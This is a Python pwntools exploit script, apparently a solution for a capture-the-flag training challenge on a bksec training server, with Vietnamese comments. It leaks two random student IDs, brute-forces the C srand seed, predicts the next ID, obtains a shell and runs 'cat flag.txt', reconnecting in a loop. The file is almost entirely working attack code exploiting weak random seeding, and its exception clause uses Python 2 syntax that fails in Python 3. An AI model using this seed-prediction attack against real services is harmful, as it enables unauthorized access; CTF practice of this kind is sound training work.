from pwn import *
import ctypes

PORT = 1337
HOST = 'pwn-bad-seed-2-1caaf16af8f7.training.bksec.vn'

libc = ctypes.CDLL("libc.so.6")

def exploit(p):
    # Stage 1: Leak
    p.sendlineafter(b"Enter your studen ID: ", b"0")
    p.recvuntil(b"We are looking for some one with ID ")
    target_1 = int(p.recvline().strip().decode())

    p.sendlineafter(b"Are you really a bksec-er? (Y/N): ", b"Y")
    p.sendlineafter(b"Enter your studen ID: ", b"0")
    p.recvuntil(b"We are looking for some one with ID ")
    target_2 = int(p.recvline().strip().decode())

    # Stage 2: Brute force find the seed
    print(f"[*] Tìm kiếm seed tạo ra {target_1} và {target_2}...")
    correct_seed = -1
    target_3 = -1
    for i in range(65536):
        libc.srand(i)
        
        v1 = libc.rand() % 10000 + 20240000
        if v1 != target_1:
            continue
            
        v2 = libc.rand() % 10000 + 20240000
        if v2 != target_2:
            continue
            
        correct_seed = i
        target_3 = libc.rand() % 10000 + 20240000
        break
        
    if correct_seed == -1:
        print("[-] Không tìm thấy seed hợp lệ")
        return

    print(f"[+] Tìm thấy seed: {correct_seed}")
    print(f"[+] Dự đoán ID tiếp theo: {target_3}")

    # Stage 3: Get shell
    p.sendlineafter(b"Are you really a bksec-er? (Y/N): ", b"Y")
    p.sendlineafter(b"Enter your studen ID: ", str(target_3).encode())
    p.recvuntil(b"Here you are!\n")

    p.sendline(b'cat flag.txt')
    p.interactive()

while True:
    p = remote(HOST, PORT, ssl=True, sni=HOST)
    try:
        exploit(p)
        p.recvline()
    except EOFError, UnboundLocalError:
        p.close()